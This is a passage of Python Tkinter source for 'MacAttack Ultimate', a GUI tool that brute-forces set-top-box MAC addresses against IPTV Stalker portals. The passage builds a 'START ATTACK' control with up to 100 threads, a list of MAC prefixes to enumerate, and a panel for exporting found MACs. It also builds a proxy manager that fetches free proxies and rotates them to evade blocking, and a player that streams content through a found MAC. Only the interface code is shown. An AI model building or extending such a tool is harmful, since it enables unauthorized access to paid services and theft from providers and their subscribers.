        menubar.add_cascade(label="🛠️ Tools", menu=tools_menu)
        
        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0, bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY)
        help_menu.add_command(label="📖 Documentation", command=self.show_help)
        help_menu.add_command(label="🎮 Keyboard Shortcuts", command=self.show_shortcuts)
        help_menu.add_separator()
        help_menu.add_command(label="ℹ️ About", command=self.show_about)
        menubar.add_cascade(label="❓ Help", menu=help_menu)
        
        self.config(menu=menubar)

    def _build_ui(self):
        # Main container
        main_container = tk.Frame(self, bg=Theme.BG_DARK)
        main_container.pack(fill="both", expand=True)
        
        # Header
        header = tk.Frame(main_container, bg=Theme.BG_MEDIUM, height=70)
        header.pack(fill="x", side="top")
        header.pack_propagate(False)
        
        # Logo/Title
        title_label = tk.Label(
            header,
            text="⚡ MacAttack Ultimate",
            font=("Helvetica", 20, "bold"),
            bg=Theme.BG_MEDIUM,
            fg=Theme.ACCENT_PRIMARY
        )
        title_label.pack(side="left", padx=30, pady=15)
        
        # Real-time clock
        self.clock_label = tk.Label(
            header,
            text=datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
            font=("Courier", 11),
            bg=Theme.BG_MEDIUM,
            fg=Theme.TEXT_SECONDARY
        )
        self.clock_label.pack(side="right", padx=30, pady=15)
        self.update_clock()
        
        version_label = tk.Label(
            header,
            text=f"v{APP_VERSION} | {CURRENT_USER}",
            font=("Helvetica", 10),
            bg=Theme.BG_MEDIUM,
            fg=Theme.TEXT_MUTED
        )
        version_label.pack(side="right", padx=10, pady=15)
        
        # Notebook
        self.notebook = ttk.Notebook(main_container)
        self.notebook.pack(fill="both", expand=True, padx=5, pady=5)

        self.tab_attack = ttk.Frame(self.notebook)
        self.tab_player = ttk.Frame(self.notebook)
        self.tab_proxies = ttk.Frame(self.notebook)
        self.tab_statistics = ttk.Frame(self.notebook)
        self.tab_settings = ttk.Frame(self.notebook)

        self.notebook.add(self.tab_attack, text="🔥 Mac Attack")
        self.notebook.add(self.tab_player, text="📺 Video Player")
        self.notebook.add(self.tab_proxies, text="🌐 Proxies")
        self.notebook.add(self.tab_statistics, text="📊 Statistics")
        self.notebook.add(self.tab_settings, text="⚙️ Settings")

        self._build_attack_tab(self.tab_attack)
        self._build_player_tab(self.tab_player)
        self._build_proxies_tab(self.tab_proxies)
        self._build_statistics_tab(self.tab_statistics)
        self._build_settings_tab(self.tab_settings)
        
        # Footer
        footer = tk.Frame(main_container, bg=Theme.BG_MEDIUM, height=35)
        footer.pack(fill="x", side="bottom")
        footer.pack_propagate(False)
        
        self.footer_status = tk.Label(
            footer,
            text="Ready to scan",
            font=("Helvetica", 10),
            bg=Theme.BG_MEDIUM,
            fg=Theme.STATUS_IDLE
        )
        self.footer_status.pack(side="left", padx=15)
        
        self.footer_info = tk.Label(
            footer,
            text="🟢 All systems operational",
            font=("Helvetica", 10),
            bg=Theme.BG_MEDIUM,
            fg=Theme.ACCENT_SUCCESS
        )
        self.footer_info.pack(side="right", padx=15)

    def update_clock(self):
        """Update real-time clock."""
        self.clock_label.config(text=datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"))
        self.after(1000, self.update_clock)

    def _build_attack_tab(self, parent):
        parent.configure(style='TFrame')
        
        # Top config frame
        config_frame = tk.Frame(parent, bg=Theme.BG_MEDIUM)
        config_frame.pack(fill="x", padx=10, pady=10)
        
        # Row 1: IPTV Link
        row1 = tk.Frame(config_frame, bg=Theme.BG_MEDIUM)
        row1.pack(fill="x", pady=5)
        
        tk.Label(row1, text="🌐 IPTV Link:", bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                font=("Helvetica", 10, "bold")).pack(side="left", padx=5)
        self.iptv_link_var = tk.StringVar(value="http://example.com:8080/c/")
        ttk.Entry(row1, textvariable=self.iptv_link_var, width=50, font=("Helvetica", 10)).pack(side="left", padx=5)
        
        tk.Label(row1, text="Type:", bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                font=("Helvetica", 10)).pack(side="left", padx=(20, 5))
        self.portal_type_var = tk.StringVar(value="Autodetect")
        ttk.Combobox(row1, textvariable=self.portal_type_var, 
                    values=["Autodetect", "Portal", "Stalker_Portal"], 
                    width=15, state="readonly", font=("Helvetica", 10)).pack(side="left")
        
        # Row 2: Speed
        row2 = tk.Frame(config_frame, bg=Theme.BG_MEDIUM)
        row2.pack(fill="x", pady=5)
        
        tk.Label(row2, text="⚡ Speed (Threads):", bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                font=("Helvetica", 10, "bold")).pack(side="left", padx=5)
        
        self.speed_var = tk.IntVar(value=10)
        self.speed_scale = ttk.Scale(row2, from_=1, to=100, orient="horizontal", 
                                     command=self._on_speed_change)
        self.speed_scale.set(self.speed_var.get())
        self.speed_scale.pack(side="left", fill="x", expand=True, padx=10)
        
        self.speed_value_label = tk.Label(row2, text=f"{self.speed_var.get()}", 
                                         bg=Theme.BG_MEDIUM, fg=Theme.ACCENT_PRIMARY, 
                                         font=("Helvetica", 12, "bold"), width=4)
        self.speed_value_label.pack(side="left", padx=5)
        
        # Preset buttons
        preset_frame = tk.Frame(row2, bg=Theme.BG_MEDIUM)
        preset_frame.pack(side="left", padx=10)
        
        for name, speed in [("Slow", 5), ("Medium", 15), ("Fast", 30), ("Turbo", 50), ("MAX", 100)]:
            btn = tk.Button(preset_frame, text=name, 
                          command=lambda s=speed: self._set_speed_preset(s),
                          bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                          font=("Helvetica", 9), relief="flat", padx=8, pady=3, cursor="hand2")
            btn.pack(side="left", padx=2)
        
        # Row 3: MAC Prefix and Rate Limit
        row3 = tk.Frame(config_frame, bg=Theme.BG_MEDIUM)
        row3.pack(fill="x", pady=5)
        
        tk.Label(row3, text="🎯 MAC Prefix:", bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                font=("Helvetica", 10)).pack(side="left", padx=5)
        prefixes = sorted([
            '00:2A:01:', 'D4:CF:F9:', '33:44:CF:', '10:27:BE:', 'A0:BB:3E:',
            '55:93:EA:', '04:D6:AA:', '11:33:01:', '00:1C:19:', '1A:00:6A:',
            '1A:00:FB:', '00:A1:79:', '00:1B:79:', '00:2A:79:', '00:1A:79: (default)'
        ])
        self.prefix_var = tk.StringVar(value='00:1A:79: (default)')
        ttk.Combobox(row3, textvariable=self.prefix_var, values=prefixes, 
                    width=20, state="readonly", font=("Helvetica", 10)).pack(side="left", padx=5)
        
        tk.Label(row3, text="⏱️ Rate Limit (sec):", bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                font=("Helvetica", 10)).pack(side="left", padx=(20, 5))
        ttk.Spinbox(row3, from_=0.1, to=5.0, increment=0.1, textvariable=self.request_delay, 
                   width=6, font=("Helvetica", 10)).pack(side="left")
        
        # Row 4: Control buttons
        row4 = tk.Frame(config_frame, bg=Theme.BG_MEDIUM)
        row4.pack(fill="x", pady=15)
        
        self.start_btn = tk.Button(row4, text="▶ START ATTACK", command=self.start_attack,
                                   bg=Theme.ACCENT_SUCCESS, fg="#000000", 
                                   font=("Helvetica", 13, "bold"), relief="flat", 
                                   padx=35, pady=12, cursor="hand2")
        self.start_btn.pack(side="left", padx=5)
        
        self.pause_btn = tk.Button(row4, text="⏸ PAUSE", command=self.pause_resume_attack,
                                   bg=Theme.ACCENT_WARNING, fg="#000000", 
                                   font=("Helvetica", 13, "bold"), relief="flat", 
                                   padx=35, pady=12, cursor="hand2", state="disabled")
        self.pause_btn.pack(side="left", padx=5)
        
        self.stop_btn = tk.Button(row4, text="⏹ STOP", command=self.stop_attack,
                                 bg=Theme.ACCENT_ERROR, fg="#000000", 
                                 font=("Helvetica", 13, "bold"), relief="flat", 
                                 padx=35, pady=12, cursor="hand2", state="disabled")
        self.stop_btn.pack(side="left", padx=5)
        
        # Row 5: Test MAC and Export
        row5 = tk.Frame(config_frame, bg=Theme.BG_MEDIUM)
        row5.pack(fill="x", pady=5)
        
        tk.Label(row5, text="🔍 Test MAC:", bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                font=("Helvetica", 10)).pack(side="left", padx=5)
        self.test_mac_var = tk.StringVar(value="")
        ttk.Entry(row5, textvariable=self.test_mac_var, width=20, 
                 font=("Helvetica", 10)).pack(side="left", padx=5)
        tk.Button(row5, text="Test", command=self.test_single_mac,
                 bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 10), relief="flat", padx=15, pady=5, cursor="hand2").pack(side="left", padx=5)
        
        tk.Button(row5, text="📊 Export CSV", command=self.export_hits_csv,
                 bg=Theme.BG_LIGHT, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 10), relief="flat", padx=15, pady=5, cursor="hand2").pack(side="left", padx=(30, 5))
        tk.Button(row5, text="📄 Export JSON", command=self.export_hits_json,
                 bg=Theme.BG_LIGHT, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 10), relief="flat", padx=15, pady=5, cursor="hand2").pack(side="left", padx=5)
        
        # Status display
        status_frame = tk.Frame(parent, bg=Theme.BG_LIGHT)
        status_frame.pack(fill="x", padx=10, pady=10)
        
        row6 = tk.Frame(status_frame, bg=Theme.BG_LIGHT)
        row6.pack(fill="x", pady=10)
        
        self.hits_label_var = tk.StringVar(value="HITS: 0")
        tk.Label(row6, textvariable=self.hits_label_var, 
                bg=Theme.BG_LIGHT, fg=Theme.ACCENT_SUCCESS, 
                font=("Helvetica", 22, "bold")).pack(side="left", padx=20)
        
        self.status_var = tk.StringVar(value="Status: Idle")
        tk.Label(row6, textvariable=self.status_var, 
                bg=Theme.BG_LIGHT, fg=Theme.STATUS_IDLE, 
                font=("Helvetica", 16, "bold")).pack(side="left", padx=20)
        
        self.current_mac_var = tk.StringVar(value="")
        tk.Label(row6, textvariable=self.current_mac_var, 
                bg=Theme.BG_LIGHT, fg=Theme.TEXT_SECONDARY, 
                font=("Courier", 13)).pack(side="left", padx=20)
        
        # Output log
        log_frame = tk.Frame(parent, bg=Theme.BG_DARK)
        log_frame.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        
        log_header = tk.Frame(log_frame, bg=Theme.BG_DARK)
        log_header.pack(fill="x")
        
        tk.Label(log_header, text="📝 OUTPUT LOG", 
                bg=Theme.BG_DARK, fg=Theme.TEXT_PRIMARY, 
                font=("Helvetica", 11, "bold")).pack(side="left")
        
        tk.Button(log_header, text="🗑️ Clear", command=lambda: self.output_text.delete("1.0", "end"),
                 bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 9), relief="flat", padx=10, pady=3, cursor="hand2").pack(side="right", padx=5)
        tk.Button(log_header, text="💾 Export", command=self.export_logs,
                 bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 9), relief="flat", padx=10, pady=3, cursor="hand2").pack(side="right")
        
        output_container = tk.Frame(log_frame, bg=Theme.BG_DARK)
        output_container.pack(fill="both", expand=True, pady=5)
        
        self.output_text = tk.Text(output_container, height=10, 
                                  bg="#0a0e27", fg="#00ff41", 
                                  wrap="word", font=("Courier", 9),
                                  insertbackground=Theme.ACCENT_PRIMARY)
        output_scroll = ttk.Scrollbar(output_container, orient="vertical", 
                                     command=self.output_text.yview)
        self.output_text.configure(yscrollcommand=output_scroll.set)
        self.output_text.pack(side="left", fill="both", expand=True)
        output_scroll.pack(side="right", fill="y")
        
        # Error log
        error_header = tk.Frame(log_frame, bg=Theme.BG_DARK)
        error_header.pack(fill="x", pady=(10, 0))
        
        tk.Label(error_header, text="⚠️ ERROR LOG", 
                bg=Theme.BG_DARK, fg=Theme.ACCENT_ERROR, 
                font=("Helvetica", 11, "bold")).pack(side="left")
        
        tk.Button(error_header, text="🗑️ Clear", command=lambda: self.error_text.delete("1.0", "end"),
                 bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 9), relief="flat", padx=10, pady=3, cursor="hand2").pack(side="right")
        
        error_container = tk.Frame(log_frame, bg=Theme.BG_DARK)
        error_container.pack(fill="both", expand=True, pady=5)
        
        self.error_text = tk.Text(error_container, height=5, 
                                 bg="#1a0a0a", fg="#ff6b6b", 
                                 wrap="word", font=("Courier", 9))
        error_scroll = ttk.Scrollbar(error_container, orient="vertical", 
                                    command=self.error_text.yview)
        self.error_text.configure(yscrollcommand=error_scroll.set)
        self.error_text.pack(side="left", fill="both", expand=True)
        error_scroll.pack(side="right", fill="y")

    def _build_player_tab(self, parent):
        parent.configure(style='TFrame')
        
        # Left sidebar
        left = tk.Frame(parent, width=320, bg=Theme.BG_MEDIUM)
        left.pack(side="left", fill="y")
        left.pack_propagate(False)

        # Connection section
        conn_frame = tk.LabelFrame(left, text=" 🔌 Connection ", 
                                  bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY,
                                  font=("Helvetica", 10, "bold"), padx=10, pady=10)
        conn_frame.pack(fill="x", padx=10, pady=10)

        tk.Label(conn_frame, text="Host:", bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY).grid(row=0, column=0, sticky="w", pady=5)
        self.host_var = tk.StringVar(value="")
        ttk.Entry(conn_frame, textvariable=self.host_var, font=("Helvetica", 9)).grid(row=0, column=1, sticky="ew", pady=5)

        tk.Label(conn_frame, text="MAC:", bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY).grid(row=1, column=0, sticky="w", pady=5)
        self.mac_var = tk.StringVar(value="")
        ttk.Entry(conn_frame, textvariable=self.mac_var, font=("Helvetica", 9)).grid(row=1, column=1, sticky="ew", pady=5)

        tk.Label(conn_frame, text="Proxy:", bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY).grid(row=2, column=0, sticky="w", pady=5)
        self.player_proxy_var = tk.StringVar(value="")
        ttk.Entry(conn_frame, textvariable=self.player_proxy_var, font=("Helvetica", 9)).grid(row=2, column=1, sticky="ew", pady=5)

        conn_frame.columnconfigure(1, weight=1)

        # Control buttons
        btn_frame = tk.Frame(left, bg=Theme.BG_MEDIUM)
        btn_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Button(btn_frame, text="📥 Get Playlist", command=self.player_get_playlist,
                 bg=Theme.ACCENT_PRIMARY, fg="#000000", 
                 font=("Helvetica", 10, "bold"), relief="flat", 
                 padx=10, pady=8, cursor="hand2").pack(side="left", fill="x", expand=True, padx=2)
        tk.Button(btn_frame, text="🗑️", command=self.player_clear_playlist,
                 bg=Theme.ACCENT_ERROR, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 10), relief="flat", 
                 padx=10, pady=8, cursor="hand2").pack(side="right", padx=2)

        # Search bar
        search_frame = tk.Frame(left, bg=Theme.BG_MEDIUM)
        search_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(search_frame, text="🔍", bg=Theme.BG_MEDIUM, 
                fg=Theme.TEXT_PRIMARY).pack(side="left")
        self.search_var = tk.StringVar()
        self.search_var.trace("w", self.on_search_changed)
        ttk.Entry(search_frame, textvariable=self.search_var, 
                 font=("Helvetica", 9)).pack(side="left", fill="x", expand=True, padx=5)

        # Category tabs
        self.cat_tabs = ttk.Notebook(left)
        self.cat_tabs.pack(fill="both", expand=True, padx=10, pady=5)

        self.tab_data = {}
        for name in ("Live", "Movies", "Series", "Favorites"):
            frame = tk.Frame(self.cat_tabs, bg=Theme.BG_DARK)
            self.cat_tabs.add(frame, text=name)
            
            lb = tk.Listbox(frame, activestyle="dotbox", 
                          bg=Theme.INPUT_BG, fg=Theme.TEXT_PRIMARY, 
                          font=("Helvetica", 9), selectbackground=Theme.ACCENT_PRIMARY,
                          selectforeground="#000000")
            scrollbar = ttk.Scrollbar(frame, orient="vertical", command=lb.yview)
            lb.configure(yscrollcommand=scrollbar.set)
            lb.pack(side="left", fill="both", expand=True)
            scrollbar.pack(side="right", fill="y")
            
            lb.bind("<Double-Button-1>", self.on_player_item_activated)
            lb.bind("<Button-3>", self.on_player_item_right_click)
            
            self.tab_data[name] = {
                "listbox": lb,
                "view": "categories" if name != "Favorites" else "favorites",
                "playlist_data": [],
                "current_category": None,
                "current_channels": [],
                "stack": [],
            }

        # Progress and status
        self.player_progress = ttk.Progressbar(left, orient="horizontal", 
                                              mode="determinate", maximum=100)
        self.player_progress.pack(fill="x", padx=10, pady=5)
        
        self.player_err_var = tk.StringVar(value="")
        tk.Label(left, textvariable=self.player_err_var, bg=Theme.BG_MEDIUM, 
                fg=Theme.ACCENT_ERROR, wraplength=280, justify="left",
                font=("Helvetica", 9)).pack(fill="x", padx=10, pady=5)

        # Right side: video player
        right = tk.Frame(parent, bg=Theme.BG_DARK)
        right.pack(side="left", fill="both", expand=True)

        self.video_canvas = tk.Canvas(right, background="black", 
                                      highlightthickness=0)
        self.video_canvas.pack(fill="both", expand=True, padx=10, pady=10)

        # Stream info
        link_frame = tk.Frame(right, bg=Theme.BG_MEDIUM)
        link_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(link_frame, text="📡 Stream:", bg=Theme.BG_MEDIUM, 
                fg=Theme.TEXT_PRIMARY, font=("Helvetica", 10)).pack(side="left", padx=5)
        self.stream_var = tk.StringVar(value="No video loaded")
        ttk.Entry(link_frame, textvariable=self.stream_var, state="readonly",
                 font=("Helvetica", 9)).pack(side="left", fill="x", expand=True, padx=5)

        # Player controls
        controls = tk.Frame(right, bg=Theme.BG_MEDIUM)
        controls.pack(fill="x", padx=10, pady=5)
        
        btn_style = {"bg": Theme.BUTTON_BG, "fg": Theme.TEXT_PRIMARY, 
                    "font": ("Helvetica", 10), "relief": "flat", 
                    "padx": 15, "pady": 8, "cursor": "hand2"}
        
        tk.Button(controls, text="▶ Play/Pause", command=self.toggle_play, 
                 **btn_style).pack(side="left", padx=2)
        tk.Button(controls, text="⏹ Stop", command=self.stop_video, 
                 **btn_style).pack(side="left", padx=2)
        tk.Button(controls, text="📷 Screenshot", command=self.take_screenshot, 
                 **btn_style).pack(side="left", padx=2)
        tk.Button(controls, text="🔊 Audio", command=self.select_audio_track, 
                 **btn_style).pack(side="left", padx=2)
        tk.Button(controls, text="💬 Subs", command=self.select_subtitle, 
                 **btn_style).pack(side="left", padx=2)
        
        # Volume control
        vol_frame = tk.Frame(right, bg=Theme.BG_MEDIUM)
        vol_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(vol_frame, text="🔊 Volume:", bg=Theme.BG_MEDIUM, 
                fg=Theme.TEXT_PRIMARY, font=("Helvetica", 10)).pack(side="left", padx=5)
        self.volume_var = tk.IntVar(value=100)
        volume_scale = ttk.Scale(vol_frame, from_=0, to=100, orient="horizontal", 
                                variable=self.volume_var, command=self.on_volume_change)
        volume_scale.pack(side="left", fill="x", expand=True, padx=5)
        
        self.vol_label = tk.Label(vol_frame, text="100%", bg=Theme.BG_MEDIUM, 
                           fg=Theme.ACCENT_PRIMARY, font=("Helvetica", 10, "bold"), width=5)
        self.vol_label.pack(side="left", padx=5)
        
        def update_vol_label(*args):
            self.vol_label.config(text=f"{self.volume_var.get()}%")
        self.volume_var.trace("w", update_vol_label)

        self.bind("<space>", lambda e: self.toggle_play())

    def _build_proxies_tab(self, parent):
        parent.configure(style='TFrame')
        
        # Header
        header = tk.Frame(parent, bg=Theme.BG_MEDIUM)
        header.pack(fill="x", padx=10, pady=10)
        
        tk.Label(header, text="🌐 PROXY MANAGEMENT", 
                bg=Theme.BG_MEDIUM, fg=Theme.ACCENT_PRIMARY, 
                font=("Helvetica", 14, "bold")).pack(side="left")
        
        # Options row
        options_frame = tk.Frame(parent, bg=Theme.BG_LIGHT)
        options_frame.pack(fill="x", padx=10, pady=10)
        
        tk.Checkbutton(options_frame, text="Enable Proxies", variable=self.proxy_enabled,
                      bg=Theme.BG_LIGHT, fg=Theme.TEXT_PRIMARY, 
                      selectcolor=Theme.BG_DARK, font=("Helvetica", 10)).pack(side="left", padx=10)
        
        tk.Label(options_frame, text="Remove after errors:", bg=Theme.BG_LIGHT, 
                fg=Theme.TEXT_PRIMARY, font=("Helvetica", 10)).pack(side="left", padx=(20, 5))
        ttk.Spinbox(options_frame, from_=0, to=20, textvariable=self.proxy_remove_after_errors, 
                   width=4, font=("Helvetica", 10)).pack(side="left")
        
        tk.Checkbutton(options_frame, text="1 thread per proxy", variable=self.alt_proxy_speed,
                      bg=Theme.BG_LIGHT, fg=Theme.TEXT_PRIMARY, 
                      selectcolor=Theme.BG_DARK, font=("Helvetica", 10)).pack(side="left", padx=(20, 0))

        # Free proxy fetching
        fetch_frame = tk.Frame(parent, bg=Theme.BG_MEDIUM)
        fetch_frame.pack(fill="x", padx=10, pady=10)
        
        tk.Label(fetch_frame, text="🌐 Free Proxies:", 
                bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
                font=("Helvetica", 11, "bold")).pack(side="left", padx=5)
        
        tk.Button(fetch_frame, text="📥 Fetch Free Proxies", 
                 command=self.fetch_free_proxies_ui,
                 bg=Theme.ACCENT_PRIMARY, fg="#000000", 
                 font=("Helvetica", 10, "bold"), relief="flat", 
                 padx=20, pady=8, cursor="hand2").pack(side="left", padx=5)
        
        tk.Label(fetch_frame, text="(Auto-fetches from 6 sources)", 
                bg=Theme.BG_MEDIUM, fg=Theme.TEXT_MUTED, 
                font=("Helvetica", 9)).pack(side="left", padx=5)

        # Proxy list
        list_header = tk.Frame(parent, bg=Theme.BG_DARK)
        list_header.pack(fill="x", padx=10, pady=(10, 0))
        
        tk.Label(list_header, text="📝 PROXY LIST (ip:port or user:pass@ip:port)", 
                bg=Theme.BG_DARK, fg=Theme.TEXT_PRIMARY, 
                font=("Helvetica", 10, "bold")).pack(side="left")
        
        self.proxy_count_label = tk.Label(list_header, text="Count: 0", 
                                          bg=Theme.BG_DARK, fg=Theme.ACCENT_PRIMARY, 
                                          font=("Helvetica", 10, "bold"))
        self.proxy_count_label.pack(side="right", padx=10)
        
        proxy_frame = tk.Frame(parent, bg=Theme.BG_DARK)
        proxy_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.proxy_text = tk.Text(proxy_frame, height=10, 
                                 bg=Theme.INPUT_BG, fg=Theme.TEXT_PRIMARY, 
                                 font=("Courier", 9), wrap="none",
                                 insertbackground=Theme.ACCENT_PRIMARY)
        proxy_scroll_y = ttk.Scrollbar(proxy_frame, orient="vertical", 
                                      command=self.proxy_text.yview)
        proxy_scroll_x = ttk.Scrollbar(proxy_frame, orient="horizontal", 
                                      command=self.proxy_text.xview)
        self.proxy_text.configure(yscrollcommand=proxy_scroll_y.set, 
                                 xscrollcommand=proxy_scroll_x.set)
        self.proxy_text.grid(row=0, column=0, sticky="nsew")
        proxy_scroll_y.grid(row=0, column=1, sticky="ns")
        proxy_scroll_x.grid(row=1, column=0, sticky="ew")
        proxy_frame.grid_rowconfigure(0, weight=1)
        proxy_frame.grid_columnconfigure(0, weight=1)
        
        # Update proxy count
        def update_proxy_count(*args):
            lines = [l.strip() for l in self.proxy_text.get("1.0", "end").splitlines() if l.strip()]
            self.proxy_count_label.config(text=f"Count: {len(lines)}")
        
        self.proxy_text.bind("<KeyRelease>", update_proxy_count)

        # Buttons
        btn_frame = tk.Frame(parent, bg=Theme.BG_DARK)
        btn_frame.pack(fill="x", padx=10, pady=10)
        
        tk.Button(btn_frame, text="⚡ Test Proxies (Ultra-Fast)", command=self.test_proxies, 
                 bg=Theme.ACCENT_SUCCESS, fg="#000000", 
                 font=("Helvetica", 10, "bold"), relief="flat", 
                 padx=20, pady=8, cursor="hand2").pack(side="left", padx=2)
        tk.Button(btn_frame, text="📥 Import", command=self.import_proxies, 
                 bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 10), relief="flat", padx=15, pady=8, cursor="hand2").pack(side="left", padx=2)
        tk.Button(btn_frame, text="💾 Export", command=self.export_proxies, 
                 bg=Theme.BUTTON_BG, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 10), relief="flat", padx=15, pady=8, cursor="hand2").pack(side="left", padx=2)
        tk.Button(btn_frame, text="🗑️ Clear", 
                 command=lambda: (self.proxy_text.delete("1.0", "end"), update_proxy_count()),
                 bg=Theme.ACCENT_ERROR, fg=Theme.TEXT_PRIMARY, 
                 font=("Helvetica", 10), relief="flat", padx=15, pady=8, cursor="hand2").pack(side="left", padx=2)

        # Output section
        output_header = tk.Frame(parent, bg=Theme.BG_DARK)
        output_header.pack(fill="x", padx=10, pady=(10, 0))
        
        tk.Label(output_header, text="📊 TEST OUTPUT", 
                bg=Theme.BG_DARK, fg=Theme.TEXT_PRIMARY, 
                font=("Helvetica", 10, "bold")).pack(side="left")
        
        output_frame = tk.Frame(parent, bg=Theme.BG_DARK)
        output_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.proxy_output = tk.Text(output_frame, height=6, 
                                   bg="#0a0e27", fg="#00ff41", 
                                   font=("Courier", 9), wrap="word")
        proxy_out_scroll = ttk.Scrollbar(output_frame, orient="vertical", 
                                        command=self.proxy_output.yview)
        self.proxy_output.configure(yscrollcommand=proxy_out_scroll.set)
        self.proxy_output.pack(side="left", fill="both", expand=True)
        proxy_out_scroll.pack(side="right", fill="y")

    def _build_statistics_tab(self, parent):
        parent.configure(style='TFrame')
        
        # Header
        header = tk.Frame(parent, bg=Theme.BG_MEDIUM)
        header.pack(fill="x", padx=10, pady=10)
        
        tk.Label(header, text="📊 ATTACK STATISTICS", 
                bg=Theme.BG_MEDIUM, fg=Theme.ACCENT_PRIMARY, 
                font=("Helvetica", 14, "bold")).pack(side="left")
        
        tk.Button(header, text="🔄 Reset Statistics", command=self.reset_statistics,
                 bg=Theme.ACCENT_WARNING, fg="#000000", 
                 font=("Helvetica", 10, "bold"), relief="flat", 
                 padx=20, pady=8, cursor="hand2").pack(side="right")

        # Statistics cards
        stats_container = tk.Frame(parent, bg=Theme.BG_DARK)
        stats_container.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.stat_labels = {}
        
        stats_to_show = [
            ("Total MACs Tested", "total_tested", Theme.ACCENT_PRIMARY),
            ("Successful Hits", "hits", Theme.ACCENT_SUCCESS),
            ("Error Count", "errors", Theme.ACCENT_ERROR),
            ("Success Rate", "success_rate", Theme.ACCENT_PRIMARY),
            ("Running Time", "running_time", Theme.TEXT_SECONDARY),
            ("Tests per Second", "tests_per_sec", Theme.ACCENT_PRIMARY),
            ("Hits per Hour", "hits_per_hour", Theme.ACCENT_SUCCESS),
        ]
        
        for i, (label_text, key, color) in enumerate(stats_to_show):
            row = i // 2
            col = i % 2
            
            card = tk.Frame(stats_container, bg=Theme.BG_MEDIUM, relief="solid", bd=1)
            card.grid(row=row, column=col, padx=10, pady=10, sticky="nsew")
            
            tk.Label(card, text=label_text, 
                    bg=Theme.BG_MEDIUM, fg=Theme.TEXT_SECONDARY, 
                    font=("Helvetica", 11)).pack(pady=(15, 5))
            
            value_label = tk.Label(card, text="0", 
                                  bg=Theme.BG_MEDIUM, fg=color, 
                                  font=("Helvetica", 24, "bold"))
            value_label.pack(pady=(0, 15))
            
            self.stat_labels[key] = value_label
            
        for i in range(4):
            stats_container.grid_rowconfigure(i, weight=1)
        for i in range(2):
            stats_container.grid_columnconfigure(i, weight=1)

        # Found MACs section
        macs_header = tk.Frame(parent, bg=Theme.BG_DARK)
        macs_header.pack(fill="x", padx=10, pady=(10, 0))
        
        tk.Label(macs_header, text="🎯 FOUND MACS (Double-click to copy)", 
                bg=Theme.BG_DARK, fg=Theme.TEXT_PRIMARY, 
                font=("Helvetica", 10, "bold")).pack(side="left")
        
        macs_frame = tk.Frame(parent, bg=Theme.BG_DARK)
        macs_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.found_macs_text = tk.Text(macs_frame, height=12, 
                                       bg="#0a1a0a", fg="#00ff41", 
                                       font=("Courier", 9), wrap="word")
        macs_scroll = ttk.Scrollbar(macs_frame, orient="vertical", 
                                   command=self.found_macs_text.yview)
        self.found_macs_text.configure(yscrollcommand=macs_scroll.set)
        self.found_macs_text.pack(side="left", fill="both", expand=True)
        macs_scroll.pack(side="right", fill="y")
        
        self.found_macs_text.bind("<Double-Button-1>", self.copy_selected_mac)

    def _build_settings_tab(self, parent):
        parent.configure(style='TFrame')
        
        canvas = tk.Canvas(parent, bg=Theme.BG_DARK, highlightthickness=0)
        scrollbar = ttk.Scrollbar(parent, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg=Theme.BG_DARK)
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        # Header
        header = tk.Frame(scrollable_frame, bg=Theme.BG_MEDIUM)
        header.pack(fill="x", padx=10, pady=10)
        
        tk.Label(header, text="⚙️ SETTINGS", 
                bg=Theme.BG_MEDIUM, fg=Theme.ACCENT_PRIMARY, 
                font=("Helvetica", 14, "bold")).pack()

        # General settings
        gen = tk.LabelFrame(scrollable_frame, text=" General Settings ", 
                           bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY,
                           font=("Helvetica", 11, "bold"), padx=15, pady=15)
        gen.pack(fill="x", padx=10, pady=10)

        self.autoload_to_player = tk.BooleanVar(value=False)
        self.autopause_player = tk.BooleanVar(value=True)
        self.single_output_file = tk.BooleanVar(value=True)
        self.use_custom_macs = tk.BooleanVar(value=False)

        tk.Checkbutton(gen, text="Auto-load found MACs into player", 
                      variable=self.autoload_to_player,
                      bg=Theme.BG_MEDIUM, fg=Theme.TEXT_PRIMARY, 
